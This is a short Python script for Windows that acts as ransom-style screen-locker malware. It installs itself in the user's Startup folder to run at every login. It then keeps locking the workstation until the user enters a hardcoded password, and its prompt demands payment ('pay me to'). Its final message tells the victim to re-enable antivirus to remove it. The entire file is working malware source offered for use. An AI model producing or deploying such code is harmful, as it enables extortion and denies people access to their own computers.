import os
import getpass
import ctypes
import time
from sys import executable

# Function to lock the screen
def lock_screen():
    ctypes.windll.user32.LockWorkStation()

# Function to add the executable to startup
def add_to_startup():
    exe_path = executable  # Path to the current executable
    startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    shortcut_path = os.path.join(startup_dir, "ScreenLocker.lnk")
    
    # Create a shortcut using Windows Scripting Host
    import win32com.client
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = exe_path
    shortcut.WorkingDirectory = os.path.dirname(exe_path)
    shortcut.Save()

# Main function for password protection
def main():
    password = "GetRekt"  # Set your password here
    while True:
        user_input = getpass.getpass("Enter the password to unlock (pay me to): ")
        if user_input == password:
            print("Access granted. The PC will unlock in 5 seconds. You can re enable your antivirus so it gets removed.")
            time.sleep(5)
            break
        else:
            print("Access denied. Locking screen...")
            lock_screen()

if __name__ == "__main__":
    add_to_startup()  # Add to startup on first run
    main()
